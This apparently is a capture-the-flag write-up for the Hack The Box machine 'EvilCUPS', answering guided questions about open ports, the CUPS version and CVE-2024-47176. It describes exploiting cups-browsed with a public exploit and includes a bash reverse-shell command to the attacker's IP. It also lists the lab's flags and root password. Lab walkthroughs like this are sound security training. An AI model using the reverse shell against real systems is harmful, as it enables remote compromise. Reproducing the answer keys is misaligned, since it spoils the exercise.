## Guided:
**Q:** How many open TCP ports are listening on EvilCUPS?<br>
**A:** 2 <br>
> (631 and 22)

**Q:** What UDP port related to one of the TCP services is listening on EvilCUPS?<br>
**A:** 631     (Cups)

**Q:** What version of CUPS is running on EvilCUPS?<br>
**A:** 2.4.2

**Q:** What is the 2024 CVE ID for a vulnerability in cups-browsed that allows any user to add a printer to a machine remotely triggering a Get-Printer-Attributes request to an attacker-controlled URL?<br>
**A:** CVE-2024-47176 <br>
> [Source](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/) <br>

### Note: 
1. Donwloaded Ippsec's [exploit](https://github.com/IppSec/evil-cups)<br>
2. lunched it, `python3 evilcups.py <MY-IP> <TARGET-IP> 'bash -c "bash -i >& /dev/tcp/<MY-IP>/4444 0>&1"'`<br>
> Opened `Web-site` -> `Printers` -> Selected the printer i've added <br>and made a request to `Print Test Page` to exec my rev-shell.

**Q:** What user is CUPS running as on EvilCUPs?<br>
**A:** lp

**Q:** Submit the flag located in the htb user's home directory.<br>
**A:** 09fa910dade79ed742b402c733a832bd

**Q:** What is the name of the legit printer installed on EvilCUPS?<br>
**A:** Canon_MB2300_series<br>
> (showed at the web-site / Printers)

**Q:** What is the full path to the completed print job with id 1 on the EvilCUPS filesystem?<br>
**A:** /var/spool/cups/d00001-001<br>
> [Source](https://www.cups.org/doc/spec-design.html) <br>
> (At 'Jobs Files' section)
    
**Q:** What is the root user's password on EvilCUPS?<br>
**A:** Br3@k-G!@ss-r00t-evilcups

**Q:** Submit the flag located in the root user's home directory.<br>
**A:** 7a43bde40c417ffcbe010780ea52be30

[gg-meme](https://www.evilsocket.net/images/2024/cups1/im_your_printer.jpg)
